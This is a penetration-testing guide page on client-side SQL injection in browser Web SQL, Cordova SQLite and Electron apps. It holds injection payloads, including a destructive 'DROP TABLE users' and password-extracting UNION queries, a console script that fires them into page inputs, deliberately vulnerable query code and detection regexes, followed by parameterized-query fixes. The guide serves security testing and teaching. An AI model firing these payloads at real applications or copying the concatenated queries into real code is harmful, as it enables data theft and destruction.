# WSTG-INPV-05.8: Testing for Client-Side SQL Injection

## Test ID
WSTG-INPV-05.8

## Test Name
Testing for Client-Side SQL Injection

## High-Level Description

Client-side SQL injection targets local databases accessed via JavaScript, such as Web SQL Database (deprecated but still present), IndexedDB with SQL-like queries, or SQLite in mobile applications (Cordova, React Native). While less common than server-side SQLi, it can expose sensitive local data or enable privilege escalation in hybrid apps.

---

## What to Check

- [ ] Web SQL Database usage
- [ ] SQLite in hybrid mobile apps
- [ ] IndexedDB query manipulation
- [ ] Local storage SQL parsing
- [ ] Electron app databases
- [ ] Browser extension databases

---

## How to Test

### Step 1: Identify Client-Side Databases

```javascript
// Browser console - Check for Web SQL Database
if (window.openDatabase) {
    console.log("[*] Web SQL Database API available");

    // Try to access existing databases
    try {
        var db = openDatabase('test', '1.0', 'Test', 2 * 1024 * 1024);
        console.log("[*] Web SQL Database accessible");
    } catch(e) {
        console.log("[-] Web SQL access error:", e);
    }
}

// Check for IndexedDB
if (window.indexedDB) {
    console.log("[*] IndexedDB available");

    // List databases
    indexedDB.databases().then(dbs => {
        console.log("[*] Databases:", dbs);
    });
}

// Check for SQL.js or similar libraries
if (window.SQL) {
    console.log("[*] SQL.js library detected");
}
```

### Step 2: Client-Side SQLi Tester

```javascript
// Client-side SQL Injection Test Script
// Run in browser console or inject via XSS

(function() {
    console.log("=== Client-Side SQL Injection Tester ===");

    // Test payloads
    const payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "1 OR 1=1",
        "' UNION SELECT * FROM sqlite_master--",
        "' AND 1=0 UNION SELECT sql FROM sqlite_master--"
    ];

    // Find and test input fields that might interact with local DB
    const inputs = document.querySelectorAll('input[type="text"], input[type="search"]');

    inputs.forEach(input => {
        // Check if input has event listeners
        const events = getEventListeners(input);

        if (events.input || events.change || events.keyup) {
            console.log(`[*] Potential DB input: ${input.name || input.id}`);

            // Try injecting payload
            payloads.forEach(payload => {
                const originalValue = input.value;
                input.value = payload;

                // Trigger events
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));

                // Restore
                input.value = originalValue;
            });
        }
    });

    // Monitor Web SQL transactions
    if (window.openDatabase) {
        const originalOpenDatabase = window.openDatabase;
        window.openDatabase = function(...args) {
            console.log('[MONITOR] openDatabase called:', args);
            const db = originalOpenDatabase.apply(this, args);

            // Wrap transaction method
            const originalTransaction = db.transaction;
            db.transaction = function(callback, errorCallback, successCallback) {
                const wrappedCallback = function(tx) {
                    // Wrap executeSql
                    const originalExecuteSql = tx.executeSql;
                    tx.executeSql = function(sql, params, successCb, errorCb) {
                        console.log('[SQL QUERY]:', sql);
                        console.log('[SQL PARAMS]:', params);

                        // Check for injection indicators
                        if (sql.includes("'") && !params.length) {
                            console.warn('[POTENTIAL SQLi] Unparameterized query with quotes');
                        }

                        return originalExecuteSql.apply(this, arguments);
                    };
                    callback(tx);
                };
                return originalTransaction.call(this, wrappedCallback, errorCallback, successCallback);
            };

            return db;
        };
    }

    console.log("=== Monitoring active. Use the application normally. ===");
})();
```

### Step 3: Web SQL Database Testing

```javascript
// Web SQL Injection Test
// Vulnerable code pattern:
function searchUsers(query) {
    var db = openDatabase('myapp', '1.0', 'My App', 5 * 1024 * 1024);

    db.transaction(function(tx) {
        // VULNERABLE - String concatenation
        tx.executeSql(
            "SELECT * FROM users WHERE name LIKE '%" + query + "%'",
            [],
            function(tx, results) {
                displayResults(results);
            }
        );
    });
}

// Test payloads:
// searchUsers("' OR '1'='1' --");
// searchUsers("' UNION SELECT password FROM users --");
// searchUsers("'; DROP TABLE users; --");

// Check for SQLite system tables
function extractSchema() {
    var db = openDatabase('myapp', '1.0', 'My App', 5 * 1024 * 1024);

    db.transaction(function(tx) {
        // Extract table schema
        tx.executeSql(
            "SELECT name, sql FROM sqlite_master WHERE type='table'",
            [],
            function(tx, results) {
                for (var i = 0; i < results.rows.length; i++) {
                    console.log("Table:", results.rows.item(i).name);
                    console.log("Schema:", results.rows.item(i).sql);
                }
            }
        );
    });
}
```

### Step 4: Hybrid Mobile App Testing

```python
#!/usr/bin/env python3
"""
Client-Side SQLi Tester for Hybrid Mobile Apps
Tests Cordova/PhoneGap SQLite databases
"""

import subprocess
import os

class MobileClientSQLiTester:
    def __init__(self, app_path):
        self.app_path = app_path
        self.findings = []

    def decompile_apk(self):
        """Decompile Android APK to analyze JS code"""
        print("[*] Decompiling APK...")
        subprocess.run(['apktool', 'd', self.app_path, '-o', 'decompiled_app'])

    def find_sql_patterns(self):
        """Search for SQL patterns in JS files"""
        print("[*] Searching for SQL patterns...")

        vulnerable_patterns = [
            r'executeSql\s*\([^,]+\+',  # String concatenation
            r'executeSql\s*\(["`\'].*\$\{',  # Template literal
            r'db\.run\s*\([^,]+\+',  # Better-sqlite3 pattern
            r'\.query\s*\(["`\']SELECT.*\+',  # Query with concat
        ]

        js_files = []
        for root, dirs, files in os.walk('decompiled_app'):
            for file in files:
                if file.endswith('.js'):
                    js_files.append(os.path.join(root, file))

        for js_file in js_files:
            with open(js_file, 'r', errors='ignore') as f:
                content = f.read()

                for pattern in vulnerable_patterns:
                    import re
                    matches = re.findall(pattern, content)
                    if matches:
                        print(f"[VULN] Potential SQLi in {js_file}")
                        self.findings.append({
                            'file': js_file,
                            'pattern': pattern,
                            'severity': 'High'
                        })

    def generate_report(self):
        """Generate findings report"""
        print("\n=== CLIENT-SIDE SQLi ANALYSIS ===")
        if not self.findings:
            print("No client-side SQL injection patterns found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] Vulnerable pattern in:")
                print(f"  File: {f['file']}")

# Usage
# tester = MobileClientSQLiTester("app.apk")
# tester.decompile_apk()
# tester.find_sql_patterns()
```

### Step 5: Electron App Database Testing

```javascript
// Electron App SQLite Testing
// Check for better-sqlite3 or sql.js usage

// Monitor require calls
const originalRequire = require;
require = function(module) {
    if (module.includes('sqlite') || module.includes('sql')) {
        console.log('[*] SQL module loaded:', module);
    }
    return originalRequire(module);
};

// If better-sqlite3 is used
// Vulnerable pattern:
const db = require('better-sqlite3')('app.db');
const stmt = db.prepare(`SELECT * FROM users WHERE name = '${userInput}'`);

// Test payloads via IPC or exposed functions
// If functions are exposed to renderer:
window.api.searchUsers("' OR '1'='1");
window.api.searchUsers("' UNION SELECT password FROM users --");
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser DevTools | Monitor Web SQL/IndexedDB |
| Frida | Hook mobile app database calls |
| apktool | Decompile Android apps |
| jadx | Decompile to Java |
| Electron DevTools | Debug Electron apps |

---

## Remediation

```javascript
// SECURE - Web SQL with parameterized queries
function searchUsersSafe(query) {
    var db = openDatabase('myapp', '1.0', 'My App', 5 * 1024 * 1024);

    db.transaction(function(tx) {
        // Use parameterized query
        tx.executeSql(
            "SELECT * FROM users WHERE name LIKE ?",
            ['%' + query + '%'],  // Parameters passed separately
            function(tx, results) {
                displayResults(results);
            }
        );
    });
}

// SECURE - Better-sqlite3 with parameters
const db = require('better-sqlite3')('app.db');
const stmt = db.prepare('SELECT * FROM users WHERE name = ?');
const result = stmt.get(userInput);

// SECURE - SQL.js with parameters
const stmt = db.prepare("SELECT * FROM users WHERE id = $id");
stmt.bind({$id: userId});
```

```javascript
// Input validation for client-side queries
function sanitizeForLocalSQL(input) {
    // Basic sanitization (parameterized queries preferred)
    if (typeof input !== 'string') {
        return '';
    }

    // Remove or escape dangerous characters
    return input.replace(/['";\\]/g, '');
}
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Web SQL injection (sensitive data) | 6.5 | Medium |
| Mobile app SQLite injection | 7.5 | High |
| Electron app SQLite injection | 7.5 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-89** | SQL Injection |

---

## Checklist

```
[ ] Web SQL Database usage identified
[ ] Client-side JS analyzed for SQL patterns
[ ] Parameterized queries verified
[ ] Mobile app databases tested
[ ] Electron app databases tested
[ ] Findings documented
```
